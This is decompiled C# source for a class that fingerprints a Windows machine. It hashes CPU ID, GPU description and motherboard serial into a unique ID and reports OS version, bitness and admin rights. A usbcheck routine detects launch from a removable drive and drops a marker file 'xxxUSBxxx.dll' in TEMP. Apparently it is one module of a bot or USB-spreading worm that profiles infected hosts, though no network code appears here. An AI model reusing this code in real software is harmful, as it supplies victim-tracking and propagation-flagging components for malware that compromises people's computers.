using System;
using System.IO;
using System.Management;
using Microsoft.Win32;

namespace _2012;

internal class x0_inf
{
	private static string inf_video()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("Description"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string inf_mobos()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("SerialNumber"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string inf_cpuid()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor WHERE DeviceID = 'CPU0'");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("ProcessorId"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string inf_bitve()
	{
		if (Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86"))
		{
			return "32";
		}
		return "64";
	}

	private static string inf_wvern()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
		string text = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = Convert.ToString(((ManagementBaseObject)val2).get_Item("Name"));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		try
		{
			text = text.Split(new char[1] { '|' })[0];
			int length = text.Split(new char[1] { ' ' })[0].Length;
			return text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
		}
		catch
		{
			return "Pico";
		}
	}

	private static string inf_adm()
	{
		if (x0_fnc.fnc_admin())
		{
			return "A";
		}
		return "N";
	}

	public static string inf_flags()
	{
		if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\xxxUSBxxx.dll"))
		{
			return "U";
		}
		return "N";
	}

	public static string inf_SO()
	{
		return inf_wvern() + " [" + inf_bitve() + "|" + inf_adm() + "]";
	}

	public static string inf_uid()
	{
		string sString = (inf_cpuid() + inf_video() + inf_mobos()).ToString();
		return x0_cry.crymd5(sString);
	}

	public static void usbcheck()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			int num = 0;
			DriveInfo driveInfo;
			while (true)
			{
				if (num < array.Length)
				{
					driveInfo = array[num];
					if (driveInfo.DriveType == DriveType.Removable)
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			if (driveInfo.RootDirectory.Root.ToString()[0] == Environment.CurrentDirectory[0])
			{
				File.Create(Environment.GetEnvironmentVariable("TEMP") + "\\xxxUSBxxx.dll");
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
